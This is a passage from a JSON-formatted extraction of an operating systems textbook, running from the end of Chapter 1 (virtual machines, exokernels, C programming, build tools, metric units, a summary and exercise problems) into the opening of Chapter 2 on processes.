type 2 hypervisor is started, it reads the installation CD-ROM (or CD\u0002ROM image file) for the chosen guest operating system and installs the guest OS\r\non a virtual disk, which is just a big file in the host operating system’s file system.\r\nType 1 hypervisors cannot do this because there is no host operating system to\r\nstore files on. They must manage their own storage on a raw disk partition.\r\nWhen the guest operating system is booted, it does the same thing it does on\r\nthe actual hardware, typically starting up some background processes and then a\r\nGUI. To the user, the guest operating system behaves the same way it does when\r\nrunning on the bare metal even though that is not the case here.\r\nA different approach to handling control instructions is to modify the operating\r\nsystem to remove them. This approach is not true virtualization, but paravirtual\u0002ization. We will discuss virtualization in more detail in Chap. 7.\r\nThe Jav a Virtual Machine\r\nAnother area where virtual machines are used, but in a somewhat different\r\nway, is for running Java programs. When Sun Microsystems invented the Java pro\u0002gramming language, it also invented a virtual machine (i.e., a computer architec\u0002ture) called the JVM (Java Virtual Machine). The Java compiler produces code\r\nfor JVM, which then typically is executed by a software JVM interpreter. The ad\u0002vantage of this approach is that the JVM code can be shipped over the Internet to\r\nany computer that has a JVM interpreter and run there. If the compiler had pro\u0002duced SPARC or x86 binary programs, for example, they could not have been\r\nshipped and run anywhere as easily. (Of course, Sun could have produced a com\u0002piler that produced SPARC binaries and then distributed a SPARC interpreter, but\r\nJVM is a much simpler architecture to interpret.) Another advantage of using JVM\r\nis that if the interpreter is implemented properly, which is not completely trivial,\r\nincoming JVM programs can be checked for safety and then executed in a protect\u0002ed environment so they cannot steal data or do any damage.\nSEC. 1.7 OPERATING SYSTEM STRUCTURE 73"
          },
          "1.7.6 Exokernels": {
            "page": 104,
            "content": "1.7.6 Exokernels\r\nRather than cloning the actual machine, as is done with virtual machines, an\u0002other strategy is partitioning it, in other words, giving each user a subset of the re\u0002sources. Thus one virtual machine might get disk blocks 0 to 1023, the next one\r\nmight get blocks 1024 to 2047, and so on.\r\nAt the bottom layer, running in kernel mode, is a program called the exokernel\r\n(Engler et al., 1995). Its job is to allocate resources to virtual machines and then\r\ncheck attempts to use them to make sure no machine is trying to use somebody\r\nelse’s resources. Each user-level virtual machine can run its own operating system,\r\nas on VM/370 and the Pentium virtual 8086s, except that each one is restricted to\r\nusing only the resources it has asked for and been allocated.\r\nThe advantage of the exokernel scheme is that it saves a layer of mapping. In\r\nthe other designs, each virtual machine thinks it has its own disk, with blocks run\u0002ning from 0 to some maximum, so the virtual machine monitor must maintain\r\ntables to remap disk addresses (and all other resources). With the exokernel, this\r\nremapping is not needed. The exokernel need only keep track of which virtual ma\u0002chine has been assigned which resource. This method still has the advantage of\r\nseparating the multiprogramming (in the exokernel) from the user operating system\r\ncode (in user space), but with less overhead, since all the exokernel has to do is\r\nkeep the virtual machines out of each other’s hair."
          }
        }
      },
      "1.8 THE WORLD ACCORDING TO C": {
        "page": 104,
        "children": {
          "1.8.1 The C Language": {
            "page": 104,
            "content": "1.8.1 The C Language\r\nThis is not a guide to C, but a short summary of some of the key differences\r\nbetween C and languages like Python and especially Java. Java is based on C, so\r\nthere are many similarities between the two. Python is somewhat different, but still\r\nfairly similar. For convenience, we focus on Java. Java, Python, and C are all\r\nimperative languages with data types, variables, and control statements, for ex\u0002ample. The primitive data types in C are integers (including short and long ones),\r\ncharacters, and floating-point numbers. Composite data types can be constructed\r\nusing arrays, structures, and unions. The control statements in C are similar to\r\nthose in Java, including if, switch, for, and while statements. Functions and param\u0002eters are roughly the same in both languages.\n74 INTRODUCTION CHAP. 1\r\nOne feature C has that Java and Python do not is explicit pointers. A pointer\r\nis a variable that points to (i.e., contains the address of) a variable or data structure.\r\nConsider the statements\r\nchar c1, c2, *p;\r\nc1 = ’c’;\r\np = &c1;\r\nc2 = *p;\r\nwhich declare c1 and c2 to be character variables and p to be a variable that points\r\nto (i.e., contains the address of) a character. The first assignment stores the ASCII\r\ncode for the character ‘‘c’’ in the variable c1. The second one assigns the address\r\nof c1 to the pointer variable p. The third one assigns the contents of the variable\r\npointed to by p to the variable c2, so after these statements are executed, c2 also\r\ncontains the ASCII code for ‘‘c’’. In theory, pointers are typed, so you are not sup\u0002posed to assign the address of a floating-point number to a character pointer, but in\r\npractice compilers accept such assignments, albeit sometimes with a warning.\r\nPointers are a very powerful construct, but also a great source of errors when used\r\ncarelessly.\r\nSome things that C does not have include built-in strings, threads, packages,\r\nclasses, objects, type safety, and garbage collection. The last one is a show stopper\r\nfor operating systems. All storage in C is either static or explicitly allocated and\r\nreleased by the programmer, usually with the library functions malloc and free. It\r\nis the latter property—total programmer control over memory—along with explicit\r\npointers that makes C attractive for writing operating systems. Operating systems\r\nare basically real-time systems to some extent, even general-purpose ones. When\r\nan interrupt occurs, the operating system may have only a few microseconds to\r\nperform some action or lose critical information. Having the garbage collector kick\r\nin at an arbitrary moment is intolerable."
          },
          "1.8.2 Header Files": {
            "page": 105,
            "content": "1.8.2 Header Files\r\nAn operating system project generally consists of some number of directories,\r\neach containing many .c files containing the code for some part of the system,\r\nalong with some .h header files that contain declarations and definitions used by\r\none or more code files. Header files can also include simple macros, such as\r\n#define BUFFER SIZE 4096\r\nwhich allows the programmer to name constants, so that when BUFFER SIZE is\r\nused in the code, it is replaced during compilation by the number 4096. Good C\r\nprogramming practice is to name every constant except 0, 1, and −1, and some\u0002times even them. Macros can have parameters, such as\r\n#define max(a, b) (a > b ? a : b)\r\nwhich allows the programmer to write\nSEC. 1.8 THE WORLD ACCORDING TO C 75\r\ni = max(j, k+1)\r\nand get\r\ni = (j > k+1 ? j : k+1)\r\nto store the larger of j and k+1 in i. Headers can also contain conditional compila\u0002tion, for example\r\n#ifdef X86\r\nintel int ack();\r\n#endif\r\nwhich compiles into a call to the function intel int ack if the macro X86 is defined\r\nand nothing otherwise. Conditional compilation is heavily used to isolate architec\u0002ture-dependent code so that certain code is inserted only when the system is com\u0002piled on the X86, other code is inserted only when the system is compiled on a\r\nSPARC, and so on. A .c file can bodily include zero or more header files using the\r\n#include directive. There are also many header files that are common to nearly\r\nev ery .c and are stored in a central directory."
          },
          "1.8.3 Large Programming Projects": {
            "page": 106,
            "content": "1.8.3 Large Programming Projects\r\nTo build the operating system, each .c is compiled into an object file by the C\r\ncompiler. Object files, which have the suffix .o, contain binary instructions for the\r\ntarget machine. They will later be directly executed by the CPU. There is nothing\r\nlike Java byte code or Python byte code in the C world.\r\nThe first pass of the C compiler is called the C preprocessor. As it reads each\r\n.c file, every time it hits a #include directive, it goes and gets the header file named\r\nin it and processes it, expanding macros, handling conditional compilation (and\r\ncertain other things) and passing the results to the next pass of the compiler as if\r\nthey were physically included.\r\nSince operating systems are very large (fiv e million lines of code is not\r\nunusual), having to recompile the entire thing every time one file is changed would\r\nbe unbearable. On the other hand, changing a key header file that is included in\r\nthousands of other files does require recompiling those files. Keeping track of\r\nwhich object files depend on which header files is completely unmanageable with\u0002out help.\r\nFortunately, computers are very good at precisely this sort of thing. On UNIX\r\nsystems, there is a program called make (with numerous variants such as gmake,\r\npmake, etc.) that reads the Makefile, which tells it which files are dependent on\r\nwhich other files. What make does is see which object files are needed to build the\r\noperating system binary and for each one, check to see if any of the files it depends\r\non (the code and headers) have been modified subsequent to the last time the ob\u0002ject file was created. If so, that object file has to be recompiled. When make has\r\ndetermined which .c files have to recompiled, it then invokes the C compiler to\n76 INTRODUCTION CHAP. 1\r\nrecompile them, thus reducing the number of compilations to the bare minimum.\r\nIn large projects, creating the Makefile is error prone, so there are tools that do it\r\nautomatically.\r\nOnce all the .o files are ready, they are passed to a program called the linker to\r\ncombine all of them into a single executable binary file. Any library functions cal\u0002led are also included at this point, interfunction references are resolved, and ma\u0002chine addresses are relocated as need be. When the linker is finished, the result is\r\nan executable program, traditionally called a.out on UNIX systems. The various\r\ncomponents of this process are illustrated in Fig. 1-30 for a program with three C\r\nfiles and two header files. Although we have been discussing operating system de\u0002velopment here, all of this applies to developing any large program.\r\ndefs.h mac.h main.c help.c other.c\r\nC\r\npreprocesor\r\nC\r\ncompiler\r\nmain.o help.o other.o\r\nlibc.a linker\r\na.out\r\nExecutable\r\nbinary program\r\nFigure 1-30. The process of compiling C and header files to make an executable."
          },
          "1.8.4 The Model of Run Time": {
            "page": 107,
            "content": "1.8.4 The Model of Run Time\r\nOnce the operating system binary has been linked, the computer can be\r\nrebooted and the new operating system started. Once running, it may dynamically\r\nload pieces that were not statically included in the binary such as device drivers\nSEC. 1.8 THE WORLD ACCORDING TO C 77\r\nand file systems. At run time the operating system may consist of multiple seg\u0002ments, for the text (the program code), the data, and the stack. The text segment is\r\nnormally immutable, not changing during execution. The data segment starts out\r\nat a certain size and initialized with certain values, but it can change and grow as\r\nneed be. The stack is initially empty but grows and shrinks as functions are called\r\nand returned from. Often the text segment is placed near the bottom of memory,\r\nthe data segment just above it, with the ability to grow upward, and the stack seg\u0002ment at a high virtual address, with the ability to grow downward, but different\r\nsystems work differently.\r\nIn all cases, the operating system code is directly executed by the hardware,\r\nwith no interpreter and no just-in-time compilation, as is normal with Java."
          }
        }
      },
      "1.9 RESEARCH ON OPERATING SYSTEMS": {
        "page": 108,
        "content": "1.9 RESEARCH ON OPERATING SYSTEMS\r\nComputer science is a rapidly advancing field and it is hard to predict where it\r\nis going. Researchers at universities and industrial research labs are constantly\r\nthinking up new ideas, some of which go nowhere but some of which become the\r\ncornerstone of future products and have massive impact on the industry and users.\r\nTelling which is which turns out to be easier to do in hindsight than in real time.\r\nSeparating the wheat from the chaff is especially difficult because it often takes 20\r\nto 30 years from idea to impact.\r\nFor example, when President Eisenhower set up the Dept. of Defense’s Ad\u0002vanced Research Projects Agency (ARPA) in 1958, he was trying to keep the\r\nArmy from killing the Navy and the Air Force over the Pentagon’s research bud\u0002get. He was not trying to invent the Internet. But one of the things ARPA did was\r\nfund some university research on the then-obscure concept of packet switching,\r\nwhich led to the first experimental packet-switched network, the ARPANET. It\r\nwent live in 1969. Before long, other ARPA-funded research networks were con\u0002nected to the ARPANET, and the Internet was born. The Internet was then happily\r\nused by academic researchers for sending email to each other for 20 years. In the\r\nearly 1990s, Tim Berners-Lee invented the World Wide Web at the CERN research\r\nlab in Geneva and Marc Andreesen wrote a graphical browser for it at the Univer\u0002sity of Illinois. All of a sudden the Internet was full of twittering teenagers. Presi\u0002dent Eisenhower is probably rolling over in his grave.\r\nResearch in operating systems has also led to dramatic changes in practical\r\nsystems. As we discussed earlier, the first commercial computer systems were all\r\nbatch systems, until M.I.T. inv ented general-purpose timesharing in the early\r\n1960s. Computers were all text-based until Doug Engelbart invented the mouse\r\nand the graphical user interface at Stanford Research Institute in the late 1960s.\r\nWho knows what will come next?\r\nIn this section and in comparable sections throughout the book, we will take a\r\nbrief look at some of the research in operating systems that has taken place during\n78 INTRODUCTION CHAP. 1\r\nthe past 5 to 10 years, just to give a flavor of what might be on the horizon. This\r\nintroduction is certainly not comprehensive. It is based largely on papers that have\r\nbeen published in the top research conferences because these ideas have at least\r\nsurvived a rigorous peer review process in order to get published. Note that in com\u0002puter science—in contrast to other scientific fields—most research is published in\r\nconferences, not in journals. Most of the papers cited in the research sections were\r\npublished by either ACM, the IEEE Computer Society, or USENIX and are avail\u0002able over the Internet to (student) members of these organizations. For more infor\u0002mation about these organizations and their digital libraries, see\r\nACM http://www.acm.org\r\nIEEE Computer Society http://www.computer.org\r\nUSENIX http://www.usenix.org\r\nVirtually all operating systems researchers realize that current operating sys\u0002tems are massive, inflexible, unreliable, insecure, and loaded with bugs, certain\r\nones more than others (names withheld here to protect the guilty). Consequently,\r\nthere is a lot of research on how to build better operating systems. Work has recent\u0002ly been published about bugs and debugging (Renzelmann et al., 2012; and Zhou et\r\nal., 2012), crash recovery (Correia et al., 2012; Ma et al., 2013; Ongaro et al.,\r\n2011; and Yeh and Cheng, 2012), energy management (Pathak et al., 2012; Pet\u0002rucci and Loques, 2012; and Shen et al., 2013), file and storage systems (Elnably\r\nand Wang, 2012; Nightingale et al., 2012; and Zhang et al., 2013a), high-per\u0002formance I/O (De Bruijn et al., 2011; Li et al., 2013a; and Rizzo, 2012), hyper\u0002threading and multithreading (Liu et al., 2011), live update (Giuffrida et al., 2013),\r\nmanaging GPUs (Rossbach et al., 2011), memory management (Jantz et al., 2013;\r\nand Jeong et al., 2013), multicore operating systems (Baumann et al., 2009; Kaprit\u0002sos, 2012; Lachaize et al., 2012; and Wentzlaff et al., 2012), operating system cor\u0002rectness (Elphinstone et al., 2007; Yang et al., 2006; and Klein et al., 2009), operat\u0002ing system reliability (Hruby et al., 2012; Ryzhyk et al., 2009, 2011 and Zheng et\r\nal., 2012), privacy and security (Dunn et al., 2012; Giuffrida et al., 2012; Li et al.,\r\n2013b; Lorch et al., 2013; Ortolani and Crispo, 2012; Slowinska et al., 2012; and\r\nUr et al., 2012), usage and performance monitoring (Harter et. al, 2012; and Ravin\u0002dranath et al., 2012), and virtualization (Agesen et al., 2012; Ben-Yehuda et al.,\r\n2010; Colp et al., 2011; Dai et al., 2013; Tarasov et al., 2013; and Williams et al.,\r\n2012) among many other topics."
      },
      "1.10 OUTLINE OF THE REST OF THIS BOOK": {
        "page": 109,
        "content": "1.10 OUTLINE OF THE REST OF THIS BOOK\r\nWe hav e now completed our introduction and bird’s-eye view of the operating\r\nsystem. It is time to get down to the details. As mentioned already, from the pro\u0002grammer’s point of view, the primary purpose of an operating system is to provide\nSEC. 1.10 OUTLINE OF THE REST OF THIS BOOK 79\r\nsome key abstractions, the most important of which are processes and threads, ad\u0002dress spaces, and files. Accordingly the next three chapters are devoted to these\r\ncritical topics.\r\nChapter 2 is about processes and threads. It discusses their properties and how\r\nthey communicate with one another. It also gives a number of detailed examples\r\nof how interprocess communication works and how to avoid some of the pitfalls.\r\nIn Chap. 3 we will study address spaces and their adjunct, memory man\u0002agement, in detail. The important topic of virtual memory will be examined, along\r\nwith closely related concepts such as paging and segmentation.\r\nThen, in Chap. 4, we come to the all-important topic of file systems. To a con\u0002siderable extent, what the user sees is largely the file system. We will look at both\r\nthe file-system interface and the file-system implementation.\r\nInput/Output is covered in Chap. 5. The concepts of device independence and\r\ndevice dependence will be looked at. Several important devices, including disks,\r\nkeyboards, and displays, will be used as examples.\r\nChapter 6 is about deadlocks. We briefly showed what deadlocks are in this\r\nchapter, but there is much more to say. Ways to prevent or avoid them are dis\u0002cussed.\r\nAt this point we will have completed our study of the basic principles of sin\u0002gle-CPU operating systems. However, there is more to say, especially about ad\u0002vanced topics. In Chap. 7, we examine virtualization. We discuss both the prin\u0002ciples, and some of the existing virtualization solutions in detail. Since virtu\u0002alization is heavily used in cloud computing, we will also gaze at existing clouds.\r\nAnother advanced topic is multiprocessor systems, including multicores, parallel\r\ncomputers, and distributed systems. These subjects are covered in Chap. 8.\r\nA hugely important subject is operating system security, which is covered in\r\nChap 9. Among the topics discussed in this chapter are threats (e.g., viruses and\r\nworms), protection mechanisms, and security models.\r\nNext we have some case studies of real operating systems. These are UNIX,\r\nLinux, and Android (Chap. 10), and Windows 8 (Chap. 11). The text concludes\r\nwith some wisdom and thoughts about operating system design in Chap. 12."
      },
      "1.11 METRIC UNITS": {
        "page": 110,
        "content": "1.11 METRIC UNITS\r\nTo avoid any confusion, it is worth stating explicitly that in this book, as in\r\ncomputer science in general, metric units are used instead of traditional English\r\nunits (the furlong-stone-fortnight system). The principal metric prefixes are listed\r\nin Fig. 1-31. The prefixes are typically abbreviated by their first letters, with the\r\nunits greater than 1 capitalized. Thus a 1-TB database occupies 1012 bytes of stor\u0002age and a 100-psec (or 100-ps) clock ticks every 10−10 seconds. Since milli and\r\nmicro both begin with the letter ‘‘m,’’ a choice had to be made. Normally, ‘‘m’’ is\r\nfor milli and ‘‘μ’’ (the Greek letter mu) is for micro.\n80 INTRODUCTION CHAP. 1\r\nExp. Explicit Prefix Exp. Explicit Prefix\r\n10−3 0.001 milli 103 1,000 Kilo\r\n10−6 0.000001 micro 106 1,000,000 Mega\r\n10−9 0.000000001 nano 109 1,000,000,000 Giga\r\n10−12 0.000000000001 pico 1012 1,000,000,000,000 Tera\r\n10−15 0.000000000000001 femto 1015 1,000,000,000,000,000 Peta\r\n10−18 0.000000000000000001 atto 1018 1,000,000,000,000,000,000 Exa\r\n10−21 0.000000000000000000001 zepto 1021 1,000,000,000,000,000,000,000 Zetta\r\n10−24 0.000000000000000000000001 yocto 1024 1,000,000,000,000,000,000,000,000 Yotta\r\nFigure 1-31. The principal metric prefixes.\r\nIt is also worth pointing out that, in common industry practice, the units for\r\nmeasuring memory sizes have slightly different meanings. There kilo means 210\r\n(1024) rather than 103 (1000) because memories are always a power of two. Thus a\r\n1-KB memory contains 1024 bytes, not 1000 bytes. Similarly, a 1-MB memory\r\ncontains 220 (1,048,576) bytes and a 1-GB memory contains 230 (1,073,741,824)\r\nbytes. However, a 1-Kbps communication line transmits 1000 bits per second and a\r\n10-Mbps LAN runs at 10,000,000 bits/sec because these speeds are not powers of\r\ntwo. Unfortunately, many people tend to mix up these two systems, especially for\r\ndisk sizes. To avoid ambiguity, in this book, we will use the symbols KB, MB, and\r\nGB for 210, 220, and 230 bytes respectively, and the symbols Kbps, Mbps, and Gbps\r\nfor 103\r\n, 106, and 109 bits/sec, respectively."
      },
      "1.12 SUMMARY": {
        "page": 111,
        "content": "1.12 SUMMARY\r\nOperating systems can be viewed from two viewpoints: resource managers and\r\nextended machines. In the resource-manager view, the operating system’s job is to\r\nmanage the different parts of the system efficiently. In the extended-machine view,\r\nthe job of the system is to provide the users with abstractions that are more con\u0002venient to use than the actual machine. These include processes, address spaces,\r\nand files.\r\nOperating systems have a long history, starting from the days when they re\u0002placed the operator, to modern multiprogramming systems. Highlights include\r\nearly batch systems, multiprogramming systems, and personal computer systems.\r\nSince operating systems interact closely with the hardware, some knowledge\r\nof computer hardware is useful to understanding them. Computers are built up of\r\nprocessors, memories, and I/O devices. These parts are connected by buses.\r\nThe basic concepts on which all operating systems are built are processes,\r\nmemory management, I/O management, the file system, and security. Each of these\r\nwill be treated in a subsequent chapter.\nSEC. 1.12 SUMMARY 81\r\nThe heart of any operating system is the set of system calls that it can handle.\r\nThese tell what the operating system really does. For UNIX, we have looked at\r\nfour groups of system calls. The first group of system calls relates to process crea\u0002tion and termination. The second group is for reading and writing files. The third\r\ngroup is for directory management. The fourth group contains miscellaneous calls.\r\nOperating systems can be structured in several ways. The most common ones\r\nare as a monolithic system, a hierarchy of layers, microkernel, client-server, virtual\r\nmachine, or exokernel.\r\nPROBLEMS\r\n1. What are the two main functions of an operating system?\r\n2. In Section 1.4, nine different types of operating systems are described. Give a list of\r\napplications for each of these systems (one per operating systems type).\r\n3. What is the difference between timesharing and multiprogramming systems?\r\n4. To use cache memory, main memory is divided into cache lines, typically 32 or 64\r\nbytes long. An entire cache line is cached at once. What is the advantage of caching an\r\nentire line instead of a single byte or word at a time?\r\n5. On early computers, every byte of data read or written was handled by the CPU (i.e.,\r\nthere was no DMA). What implications does this have for multiprogramming?\r\n6. Instructions related to accessing I/O devices are typically privileged instructions, that\r\nis, they can be executed in kernel mode but not in user mode. Give a reason why these\r\ninstructions are privileged.\r\n7. The family-of-computers idea was introduced in the 1960s with the IBM System/360\r\nmainframes. Is this idea now dead as a doornail or does it live on?\r\n8. One reason GUIs were initially slow to be adopted was the cost of the hardware need\u0002ed to support them. How much video RAM is needed to support a 25-line × 80-row\r\ncharacter monochrome text screen? How much for a 1200 × 900-pixel 24-bit color bit\u0002map? What was the cost of this RAM at 1980 prices ($5/KB)? How much is it now?\r\n9. There are several design goals in building an operating system, for example, resource\r\nutilization, timeliness, robustness, and so on. Give an example of two design goals that\r\nmay contradict one another.\r\n10. What is the difference between kernel and user mode? Explain how having two distinct\r\nmodes aids in designing an operating system.\r\n11. A 255-GB disk has 65,536 cylinders with 255 sectors per track and 512 bytes per sec\u0002tor. How many platters and heads does this disk have? Assuming an average cylinder\r\nseek time of 11 ms, average rotational delay of 7 msec and reading rate of 100 MB/sec,\r\ncalculate the average time it will take to read 400 KB from one sector.\n82 INTRODUCTION CHAP. 1\r\n12. Which of the following instructions should be allowed only in kernel mode?\r\n(a) Disable all interrupts.\r\n(b) Read the time-of-day clock.\r\n(c) Set the time-of-day clock.\r\n(d) Change the memory map.\r\n13. Consider a system that has two CPUs, each CPU having two threads (hyperthreading).\r\nSuppose three programs, P0, P1, and P2, are started with run times of 5, 10 and 20\r\nmsec, respectively. How long will it take to complete the execution of these programs?\r\nAssume that all three programs are 100% CPU bound, do not block during execution,\r\nand do not change CPUs once assigned.\r\n14. A computer has a pipeline with four stages. Each stage takes the same time to do its\r\nwork, namely, 1 nsec. How many instructions per second can this machine execute?\r\n15. Consider a computer system that has cache memory, main memory (RAM) and disk,\r\nand an operating system that uses virtual memory. It takes 1 nsec to access a word\r\nfrom the cache, 10 nsec to access a word from the RAM, and 10 ms to access a word\r\nfrom the disk. If the cache hit rate is 95% and main memory hit rate (after a cache\r\nmiss) is 99%, what is the average time to access a word?\r\n16. When a user program makes a system call to read or write a disk file, it provides an\r\nindication of which file it wants, a pointer to the data buffer, and the count. Control is\r\nthen transferred to the operating system, which calls the appropriate driver. Suppose\r\nthat the driver starts the disk and terminates until an interrupt occurs. In the case of\r\nreading from the disk, obviously the caller will have to be blocked (because there are\r\nno data for it). What about the case of writing to the disk? Need the caller be blocked\r\naw aiting completion of the disk transfer?\r\n17. What is a trap instruction? Explain its use in operating systems.\r\n18. Why is the process table needed in a timesharing system? Is it also needed in personal\r\ncomputer systems running UNIX or Windows with a single user?\r\n19. Is there any reason why you might want to mount a file system on a nonempty direc\u0002tory? If so, what is it?\r\n20. For each of the following system calls, give a condition that causes it to fail: fork, exec,\r\nand unlink.\r\n21. What type of multiplexing (time, space, or both) can be used for sharing the following\r\nresources: CPU, memory, disk, network card, printer, keyboard, and display?\r\n22. Can the\r\ncount = write(fd, buffer, nbytes);\r\ncall return any value in count other than nbytes? If so, why?\r\n23. A file whose file descriptor is fd contains the following sequence of bytes: 3, 1, 4, 1, 5,\r\n9, 2, 6, 5, 3, 5. The following system calls are made:\r\nlseek(fd, 3, SEEK SET);\r\nread(fd, &buffer, 4);\nCHAP. 1 PROBLEMS 83\r\nwhere the lseek call makes a seek to byte 3 of the file. What does buffer contain after\r\nthe read has completed?\r\n24. Suppose that a 10-MB file is stored on a disk on the same track (track 50) in consecu\u0002tive sectors. The disk arm is currently situated over track number 100. How long will\r\nit take to retrieve this file from the disk? Assume that it takes about 1 ms to move the\r\narm from one cylinder to the next and about 5 ms for the sector where the beginning of\r\nthe file is stored to rotate under the head. Also, assume that reading occurs at a rate of\r\n200 MB/s.\r\n25. What is the essential difference between a block special file and a character special\r\nfile?\r\n26. In the example given in Fig. 1-17, the library procedure is called read and the system\r\ncall itself is called read. Is it essential that both of these have the same name? If not,\r\nwhich one is more important?\r\n27. Modern operating systems decouple a process address space from the machine’s physi\u0002cal memory. List two advantages of this design.\r\n28. To a programmer, a system call looks like any other call to a library procedure. Is it\r\nimportant that a programmer know which library procedures result in system calls?\r\nUnder what circumstances and why?\r\n29. Figure 1-23 shows that a number of UNIX system calls have no Win32 API equiv\u0002alents. For each of the calls listed as having no Win32 equivalent, what are the conse\u0002quences for a programmer of converting a UNIX program to run under Windows?\r\n30. A portable operating system is one that can be ported from one system architecture to\r\nanother without any modification. Explain why it is infeasible to build an operating\r\nsystem that is completely portable. Describe two high-level layers that you will have in\r\ndesigning an operating system that is highly portable.\r\n31. Explain how separation of policy and mechanism aids in building microkernel-based\r\noperating systems.\r\n32. Virtual machines have become very popular for a variety of reasons. Nevertheless,\r\nthey hav e some downsides. Name one.\r\n33. Here are some questions for practicing unit conversions:\r\n(a) How long is a nanoyear in seconds?\r\n(b) Micrometers are often called microns. How long is a megamicron?\r\n(c) How many bytes are there in a 1-PB memory?\r\n(d) The mass of the earth is 6000 yottagrams. What is that in kilograms?\r\n34. Write a shell that is similar to Fig. 1-19 but contains enough code that it actually works\r\nso you can test it. You might also add some features such as redirection of input and\r\noutput, pipes, and background jobs.\r\n35. If you have a personal UNIX-like system (Linux, MINIX 3, FreeBSD, etc.) available\r\nthat you can safely crash and reboot, write a shell script that attempts to create an\r\nunlimited number of child processes and observe what happens. Before running the\r\nexperiment, type sync to the shell to flush the file system buffers to disk to avoid\n84 INTRODUCTION CHAP. 1\r\nruining the file system. You can also do the experiment safely in a virtual machine.\r\nNote: Do not try this on a shared system without first getting permission from the sys\u0002tem administrator. The consequences will be instantly obvious so you are likely to be\r\ncaught and sanctions may follow.\r\n36. Examine and try to interpret the contents of a UNIX-like or Windows directory with a\r\ntool like the UNIX od program. (Hint: How you do this will depend upon what the OS\r\nallows. One trick that may work is to create a directory on a USB stick with one oper\u0002ating system and then read the raw device data using a different operating system that\r\nallows such access.)\n2\r\nPROCESSES AND THREADS\r\nWe are now about to embark on a detailed study of how operating systems are\r\ndesigned and constructed. The most central concept in any operating system is the\r\nprocess: an abstraction of a running program. Everything else hinges on this con\u0002cept, and the operating system designer (and student) should have a thorough un\u0002derstanding of what a process is as early as possible.\r\nProcesses are one of the oldest and most important abstractions that operating\r\nsystems provide. They support the ability to have (pseudo) concurrent operation\r\nev en when there is only one CPU available. They turn a single CPU into multiple\r\nvirtual CPUs. Without the process abstraction, modern computing could not exist.\r\nIn this chapter we will go into considerable detail about processes and their first\r\ncousins, threads.\r\n2.1 PROCESSES\r\nAll modern computers often do several things at the same time. People used to\r\nworking with computers may not be fully aware of this fact, so a few examples\r\nmay make the point clearer. First consider a Web server. Requests come in from\r\nall over asking for Web pages. When a request comes in, the server checks to see if\r\nthe page needed is in the cache. If it is, it is sent back; if it is not, a disk request is\r\nstarted to fetch it. However, from the CPU’s perspective, disk requests take eter\u0002nity. While waiting for a disk request to complete, many more requests may come\r\n85"
      }
    }
  },
  "2 PROCESSES AND THREADS": {
    "page": 116,
    "children": {
      "2.1 PROCESSES": {
        "page": 116,
        "children": {
          "2.1.1 The Process Model": {
            "page": 117,
            "content": "2.1.1 The Process Model\r\nIn this model, all the runnable software on the computer, sometimes including\r\nthe operating system, is organized into a number of sequential processes, or just\r\nprocesses for short. A process is just an instance of an executing program, includ\u0002ing the current values of the program counter, registers, and variables. Con\u0002ceptually, each process has its own virtual CPU. In reality, of course, the real CPU\r\nswitches back and forth from process to process, but to understand the system, it is\r\nmuch easier to think about a collection of processes running in (pseudo) parallel\r\nthan to try to keep track of how the CPU switches from program to program. This\r\nrapid switching back and forth is called multiprogramming, as we saw in Chap.\r\n1.\r\nIn Fig. 2-1(a) we see a computer multiprogramming four programs in memory.\r\nIn Fig. 2-1(b) we see four processes, each with its own flow of control (i.e., its own\r\nlogical program counter), and each one running independently of the other ones.\r\nOf course, there is only one physical program counter, so when each process runs,\r\nits logical program counter is loaded into the real program counter. When it is fin\u0002ished (for the time being), the physical program counter is saved in the process’\r\nstored logical program counter in memory. In Fig. 2-1(c) we see that, viewed over\nSEC. 2.1 PROCESSES 87\r\na long enough time interval, all the processes have made progress, but at any giv en\r\ninstant only one process is actually running.\r\nA\r\nB\r\nC\r\nD\r\nD\r\nC\r\nB\r\nA\r\nProcess\r\nswitch\r\nOne program counter\r\nFour program counters\r\nProcess\r\nTime\r\nA B CD\r\n(a) (b) (c)\r\nFigure 2-1. (a) Multiprogramming four programs. (b) Conceptual model of four\r\nindependent, sequential processes. (c) Only one program is active at once.\r\nIn this chapter, we will assume there is only one CPU. Increasingly, howev er,\r\nthat assumption is not true, since new chips are often multicore, with two, four, or\r\nmore cores. We will look at multicore chips and multiprocessors in general in\r\nChap. 8, but for the time being, it is simpler just to think of one CPU at a time. So\r\nwhen we say that a CPU can really run only one process at a time, if there are two\r\ncores (or CPUs) each of them can run only one process at a time.\r\nWith the CPU switching back and forth among the processes, the rate at which\r\na process performs its computation will not be uniform and probably not even\r\nreproducible if the same processes are run again. Thus, processes must not be pro\u0002grammed with built-in assumptions about timing. Consider, for example, an audio\r\nprocess that plays music to accompany a high-quality video run by another device.\r\nBecause the audio should start a little later than the video, it signals the video ser\u0002ver to start playing, and then runs an idle loop 10,000 times before playing back\r\nthe audio. All goes well, if the loop is a reliable timer, but if the CPU decides to\r\nswitch to another process during the idle loop, the audio process may not run again\r\nuntil the corresponding video frames have already come and gone, and the video\r\nand audio will be annoyingly out of sync. When a process has critical real-time re\u0002quirements like this, that is, particular events must occur within a specified number\r\nof milliseconds, special measures must be taken to ensure that they do occur. Nor\u0002mally, howev er, most processes are not affected by the underlying multiprogram\u0002ming of the CPU or the relative speeds of different processes.\r\nThe difference between a process and a program is subtle, but absolutely cru\u0002cial. An analogy may help you here. Consider a culinary-minded computer scien\u0002tist who is baking a birthday cake for his young daughter. He has a birthday cake\r\nrecipe and a kitchen well stocked with all the input: flour, eggs, sugar, extract of\r\nvanilla, and so on. In this analogy, the recipe is the program, that is, an algorithm\r\nexpressed in some suitable notation, the computer scientist is the processor (CPU),\n88 PROCESSES AND THREADS CHAP. 2\r\nand the cake ingredients are the input data. The process is the activity consisting of\r\nour baker reading the recipe, fetching the ingredients, and baking the cake.\r\nNow imagine that the computer scientist’s son comes running in screaming his\r\nhead off, saying that he has been stung by a bee. The computer scientist records\r\nwhere he was in the recipe (the state of the current process is saved), gets out a first\r\naid book, and begins following the directions in it. Here we see the processor being\r\nswitched from one process (baking) to a higher-priority process (administering\r\nmedical care), each having a different program (recipe versus first aid book).\r\nWhen the bee sting has been taken care of, the computer scientist goes back to his\r\ncake, continuing at the point where he left off.\r\nThe key idea here is that a process is an activity of some kind. It has a pro\u0002gram, input, output, and a state. A single processor may be shared among several\r\nprocesses, with some scheduling algorithm being accustomed to determine when to\r\nstop work on one process and service a different one. In contrast, a program is\r\nsomething that may be stored on disk, not doing anything.\r\nIt is worth noting that if a program is running twice, it counts as two processes.\r\nFor example, it is often possible to start a word processor twice or print two files at\r\nthe same time if two printers are available. The fact that two processes happen to\r\nbe running the same program does not 